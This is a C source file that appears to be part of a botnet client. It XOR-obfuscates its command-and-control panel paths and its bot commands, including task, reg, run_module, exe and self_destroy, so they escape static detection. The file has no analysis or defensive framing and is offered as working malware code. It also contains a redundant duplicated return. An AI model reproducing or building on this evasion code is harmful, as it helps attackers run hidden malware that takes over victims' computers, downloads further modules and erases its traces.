#include "BotConfig.h"
#include "core/xor.h"
#include "Core/Common.h"
#include "Core/core.h"

wchar_t* hide_admin_path() {

    static wchar_t str_unicode_admin[1024];
    static char str_askii_admin[1024 * sizeof(wchar_t)];

    strncpy(str_askii_admin, XorStr(ADMIN_PATH), sizeof(str_askii_admin));
    ASCIIToUnicode((char*)str_askii_admin, str_unicode_admin);
    return str_unicode_admin;
    
    return str_unicode_admin;
}

wchar_t* hide_ping_path() {

    static wchar_t str_unicode_ping[1024];
    static char str_askii_ping[1024 * sizeof(wchar_t)];

    strncpy(str_askii_ping, XorStr(PING), sizeof(str_askii_ping));
    ASCIIToUnicode((char*)str_askii_ping, str_unicode_ping);
    return str_unicode_ping;
}

wchar_t* hide_reg_path() {

    static wchar_t str_unicode_reg[1024];
    static char str_askii_reg[1024 * sizeof(wchar_t)];

    strncpy(str_askii_reg, XorStr(REG), sizeof(str_askii_reg));
    ASCIIToUnicode((char*)str_askii_reg, str_unicode_reg);
    return str_unicode_reg;
}

wchar_t* hide_download_module_path() {

    static wchar_t str_unicode_download[1024];
    static char str_askii_download[1024 * sizeof(wchar_t)];

    strncpy(str_askii_download, XorStr(DOWNLOAD_MODULE), sizeof(str_askii_download));
    ASCIIToUnicode((char*)str_askii_download, str_unicode_download);
    return str_unicode_download;
}

wchar_t* hide_error_path() {

    static wchar_t str_unicode_error[1024];
    static char str_askii_error[1024 * sizeof(wchar_t)];

    strncpy(str_askii_error, XorStr(ERROR_PATH), sizeof(str_askii_error));
    ASCIIToUnicode((char*)str_askii_error, str_unicode_error);
    return str_unicode_error;
}

char* hide_str_task() {

    static char str_askii_str_task[1024 * sizeof(wchar_t)];
    strncpy(str_askii_str_task, XorStr("task"), sizeof(str_askii_str_task));
    
    return str_askii_str_task;
}

char* hide_str_reg() {

    static char str_askii_str_reg[1024 * sizeof(wchar_t)];
    strncpy(str_askii_str_reg, XorStr("reg"), sizeof(str_askii_str_reg));
    
    return str_askii_str_reg;
}

char* hide_str_self_destroy() {

    static char str_askii_str_self_destroy[1024 * sizeof(wchar_t)];
    strncpy(str_askii_str_self_destroy, XorStr("self_destroy"), sizeof(str_askii_str_self_destroy));
    
    return str_askii_str_self_destroy;
}

char* hide_str_run_module() {

    static char str_askii_str_run_module[1024 * sizeof(wchar_t)];
    strncpy(str_askii_str_run_module, XorStr("run_module"), sizeof(str_askii_str_run_module));
    
    return str_askii_str_run_module;
}

char* hide_str_ping() {

    static char str_askii_str_ping[1024 * sizeof(wchar_t)];
    strncpy(str_askii_str_ping, XorStr("ping"), sizeof(str_askii_str_ping));

    return str_askii_str_ping;
}

char* hide_str_exe() {

    static char str_askii_str_ping[1024 * sizeof(wchar_t)];
    strncpy(str_askii_str_ping, XorStr("exe"), sizeof(str_askii_str_ping));

    return str_askii_str_ping;
}